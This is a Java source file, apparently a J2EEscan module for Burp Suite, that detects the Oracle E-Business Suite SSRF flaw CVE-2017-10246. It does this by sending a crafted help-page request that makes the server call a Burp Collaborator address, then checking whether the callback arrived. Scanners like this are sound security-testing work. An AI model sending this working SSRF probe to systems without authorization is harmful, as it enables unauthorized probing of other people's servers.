package burp.j2ee.issues.impl;

import burp.CustomHttpRequestResponse;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IRequestInfo;
import burp.IResponseInfo;

import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.annotation.RunOnlyOnce;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;

import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;


/**
 *
 * Oracle E-Business Suite - Server Side Request Forgery
 *
 *
 *
 * Refs: 
 * - CVE-2017-10246 - https://www.exploit-db.com/exploits/42340 -
 *
 *
 * TODO XXE -
 * https://packetstormsecurity.com/files/134117/Oracle-E-Business-Suite-12.1.3-XXE-Injection.html
 *
 */
public class OracleEBSSSRF implements IModule {

    private static final String TITLE = "Oracle E-Business Suite - SSRF";
    private static final String DESCRIPTION = "J2EEscan detect a Server Side Request Forgery on the Oracle E-Business Suite<br />"
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://www.exploit-db.com/exploits/42340<br />";

    private static final String REMEDY = "It's reccomended to apply the security patch provided by Oracle:<br />"
            + "https://nvd.nist.gov/vuln/detail/CVE-2017-10246<br />";

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();
    
    private PrintWriter stderr;

    @RunOnlyOnce
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        
        List<IScanIssue> issues = new ArrayList<>();

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int port = url.getPort();
        String protocol = url.getProtocol();
        Boolean isSSL = (protocol.equals("https"));

        String system = host.concat(Integer.toString(port));

        // Collaborator context
        IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
        String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
        
        String Oracle_SSRF_Help = String.format("/OA_HTML/help?locale=en_AE&group=per:br_prod_HR:US&topic=http://%s:80/", currentCollaboratorPayload);

        // System not yet tested for this vulnerability
        if (!hs.contains(system)) {

            hs.add(system);
            
            try {
                URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), Oracle_SSRF_Help);

                byte[] helpSSRFtest = helpers.buildHttpRequest(urlToTest);

                byte[] responseBytes = callbacks.makeHttpRequest(url.getHost(),
                        url.getPort(), isSSL, helpSSRFtest);

                // Poll Burp Collaborator for remote interaction
                List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

                if (!collaboratorInteractions.isEmpty()) {

                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            urlToTest,
                            new CustomHttpRequestResponse(helpSSRFtest, responseBytes, baseRequestResponse.getHttpService()),
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Certain
                    ));
                }

            } catch (MalformedURLException ex) {
                stderr.println("Malformed URL Exception " + ex);
            }

        } 
        
        return issues;
        
    }
}
